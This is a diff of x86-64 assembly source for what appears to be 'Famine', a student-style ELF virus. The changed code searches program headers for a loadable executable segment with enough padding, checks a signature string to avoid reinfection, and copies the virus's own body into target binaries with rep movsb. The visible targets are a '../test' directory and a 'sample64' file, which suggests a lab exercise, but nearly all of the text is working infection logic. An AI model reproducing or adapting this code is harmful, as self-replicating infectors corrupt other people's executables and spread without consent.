@@ -106,41 +106,57 @@ _check_file:
 		jne _leave_return
 
 	; === Find text segment ===
-	_fd_txt_seg:
+	_find_txt_seg:
 		mov r14, rax								; rax -> elf start addr
 		movzx r15, word [r14 + elf64_ehdr.e_phnum]	; r15 = number of segments
 		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
 		xor rcx, rcx								; loop counter
-		mov r13, r14								; r13 will point to each phdr
-		_segment_loop:
-			cmp r15w, cx
-			je	_leave_return
-			cmp word [r13], PT_LOAD
-			je _txt_found
-			inc rcx
-			add r13, elf64_phdr_size			; r13 -> tab_phdr[rcx].p_type
-			jmp _segment_loop
-	
+	; === run through segments ===
+	_segment_loop:
+		cmp r15w, cx
+		je	_leave_return
+		bt word [r14], 0					; segment is loadable
+		jnc _continue
+		bt qword [r14], 0x20
+		jc _check_cave_size
+		_continue:
+		inc rcx
+		add r14, elf64_phdr_size			; r14 -> next_phdr(.p_type)
+		jmp _segment_loop
+
+		_check_cave_size:
+			mov r13, r14
+			add r13, elf64_phdr_size				; r13 -> next_phdr(.p_type)
+			add r13, elf64_phdr.p_offset			; r13 -> next_phdr.offset
+			mov rbx, [r14 + elf64_phdr.p_offset]
+			add rbx, [r14 + elf64_phdr.p_filesz]
+			add rbx, CODE_LEN						; rbx = offset end of futur infected segment
+			cmp [r13], rbx
+			jle	_segment_loop
+
 	; === found text segment ===
-	_txt_found:
-		add r13, [r13 + elf64_phdr.p_filesz]	; jmp to potential injection addr
-		; inc r13								; Voir si necessaire
+	_valid_seg_found:
+		add r14, [r14 + elf64_phdr.p_filesz]	; jmp to end of the segment
+		add r14, CODE_LEN
+		sub r14, _end - signature						; jmp to potential signature
+		
 	; === check if infected ===
 		lea r12, signature
-		mov rax, [r12]
-		cmp rax, qword [r13]
+		mov r12, [r12]
+		cmp r12, qword [r14]
 		je	_leave_return
+		
 	; === Infection ===
+	_infection:
 		push rcx
+		sub r14, elf64_phdr.p_filesz + CODE_LEN
 		xor rcx, rcx
-		_strcpy_loop:
-			cmp byte [r12 + rcx], 0
-			je	_strcpy_loop_end
-			mov al, byte [r12 + rcx]
-			mov [r13 + rcx], al
-			inc rcx
-			jmp _strcpy_loop
-		_strcpy_loop_end:
+		mov rdi, r14									; rdi -> end of curr_seg(start of injection)
+		lea rsi, _start									; rsi -> end of our code
+		mov rcx, CODE_LEN
+		cld												; copy from _start to _end (= !std)
+		rep movsb
+		_end_infection:
 		pop rcx	
 		jmp _leave_return
 	; *** pas obligatoire ***
@@ -149,6 +165,11 @@ _check_file:
 		mov	rdi, CHF(check_file.file_fd)
 		syscall
 		jmp _leave_return
+
+; _cpy_code:
+; 	mov rcx, CODE_LEN
+; 	rep movsb
+; 	jmp _copy_code_end
 
 _leave_return:
 	leave
@@ -165,4 +186,5 @@ _exit:
 dir1        db  "../test", 0
 open        db  "It worked", 10, 0
 file_name	db	"sample64", 0x0
-signature	db	"Famine version 1.0 (c)oded by anvincen-eedy"
+signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
+_end:
